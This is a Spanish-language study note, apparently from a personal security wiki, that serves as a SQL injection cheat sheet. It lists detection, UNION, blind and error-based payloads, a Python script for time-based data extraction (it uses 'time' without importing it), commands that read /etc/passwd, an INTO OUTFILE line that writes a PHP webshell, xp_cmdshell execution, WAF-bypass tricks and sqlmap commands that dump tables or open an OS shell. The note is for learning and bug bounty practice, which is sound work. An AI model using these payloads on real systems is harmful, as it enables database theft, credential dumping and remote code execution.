---
title: "SQL Injection"
type: note
status: active
tags:
  - seguridad
  - web
  - sqli
  - vulnerabilidades
aliases:
  - SQLi
  - Inyeccion SQL
created: 2026-06-13
updated: 2026-06-13
---

# SQL Injection

> [!INFO] Fuente
> PortSwigger SQLi, PayloadsAllTheThings, SQL Injection Knowledge Base.

---

## Deteccion

### Pruebas basicas

```sql
' OR '1'='1
" OR "1"="1
' OR 1=1--
" OR 1=1--
' OR 1=1#
' OR 1=1--
' OR '1'='1'--
1' ORDER BY 1--    # Encontrar numero de columnas
1' ORDER BY 2--
1' ORDER BY 3--    # Hasta que de error
```

### Time-based

```sql
' OR SLEEP(5)--
' WAITFOR DELAY '00:00:05'--   # MSSQL
AND SLEEP(5)
OR SLEEP(5) AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

### Content-based (Boolean)

```sql
' AND '1'='1   → True (igual que antes)
' AND '1'='2   → False (cambia la respuesta)
' AND 1=1--    → True
' AND 1=2--    → False
```

### Error-based

```sql
' AND extractvalue(1,concat(0x7e,database()))--  # MySQL
' AND 1=CAST(@@version AS INT)--                  # SQL Server
```

---

## Explotacion

### Encontrar numero de columnas

```sql
' ORDER BY 1--   → OK
' ORDER BY 2--   → OK
' ORDER BY 3--   → OK
' ORDER BY 4--   → ERROR (3 columnas)
```

### UNION SELECT

```sql
' UNION SELECT 'a','b','c'--
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,username,password FROM users--
```

### Extraer datos utiles

```sql
# MySQL
@@version                  # Version
database()                 # DB actual
user()                     # Usuario actual
@@datadir                  # Directorio de datos
LOAD_FILE('/etc/passwd')   # Leer archivos (si tenes FILE privilege)
INTO OUTFILE '/tmp/shell.php' FIELDS TERMINATED BY '<?php system($_GET[1]);?>'  # Webshell

# SQL Server
@@version
db_name()
SYSTEM_USER
HOST_NAME()
xp_cmdshell('whoami')      # RCE (si esta habilitado, comunmente deshabilitado)

# PostgreSQL
version()
current_database()
current_user
pg_read_file('/etc/passwd')
COPY (SELECT 'shell') TO '/tmp/shell.php'
```

---

## Blind SQLi

### Time-based (MySQL)

```sql
' AND IF(SUBSTRING((SELECT database()),1,1)='t',SLEEP(3),0)--
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100,SLEEP(3),0)--
```

### Boolean-based

```sql
' AND SUBSTRING((SELECT database()),1,1)='t'--  → True
' AND SUBSTRING((SELECT database()),1,1)='z'--  → False
```

### Script automatizado

```python
import requests
import string

url = "https://target.com/api"
# Blind SQLi time-based auto-extraction
chars = string.ascii_lowercase + string.digits
extracted = ""

for pos in range(1, 33):
    for c in chars:
        payload = f"' OR (SELECT SUBSTRING(database(),{pos},1))='{c}' AND SLEEP(1)--"
        start = time.time()
        r = requests.get(url, params={"id": payload})
        elapsed = time.time() - start
        if elapsed > 1:
            extracted += c
            print(extracted)
            break
```

---

## Second Order SQLi

```sql
# El payload se guarda (no se ejecuta) y se ejecuta despues al usarse en otra query
# Ej: Registrarse con usuario: admin'--
#     Despues, al ver el perfil, la query es: SELECT * FROM users WHERE username = 'admin'--'
#     ¡Se ejecuta la inyeccion!

# Registro:
username: admin'--
password: test123

# Algun endpoint usa ese username en una query:
# SELECT * FROM users WHERE username = '$username'
# → SELECT * FROM users WHERE username = 'admin'--'
# → Devuelve el usuario admin sin necesidad de password
```

---

## Bypass de WAF para SQLi

| Tecnica | Ejemplo |
|---------|---------|
| Case variation | `SeLeCt` en vez de `SELECT` |
| Comments | `SEL/**/ECT` |
| Double encoding | `%253c` en vez de `%3c` |
| Hex encoding | `0x7573657273` en vez de `'users'` |
| Null bytes | `%00' OR 1=1--` |
| HTTP Parameter Pollution | `?id=1&id=2' OR 1=1--` |

---

## Automatizacion con sqlmap

```bash
# Basico
sqlmap -u "https://target.com/page?id=1" --batch

# Con cookie
sqlmap -u "..." --cookie="session=abc123" --batch

# Blind time-based
sqlmap -u "..." --technique=T --batch

# Extraer DBs
sqlmap -u "..." --dbs --batch

# Extraer tablas de una DB
sqlmap -u "..." -D database --tables --batch

# Extraer datos
sqlmap -u "..." -D database -T users --dump --batch

# OS shell
sqlmap -u "..." --os-shell --batch
```

> [!WARNING] sqlmap es detectado
> sqlmap manda muchos requests y es facilmente detectado por WAFs. Para programas reales de bug bounty, aprende a hacerlo **manual** primero.

---

## Labs y practica

| Recurso | Link |
|---------|------|
| PortSwigger SQLi | portswigger.net/web-security/sql-injection |
| SQLZoo (aprender SQL) | sqlzoo.net |
| TryHackMe SQL Injection | tryhackme.com |
| DVWA SQLi | dvwa.co.uk |

---

## Ver tambien

- [[SEGURIDAD/Vulnerabilidades Web]]
- [[SEGURIDAD/XSS]]
- [[SEGURIDAD/Hacking Activo]]
- [[SEGURIDAD/00 - INDICE]]
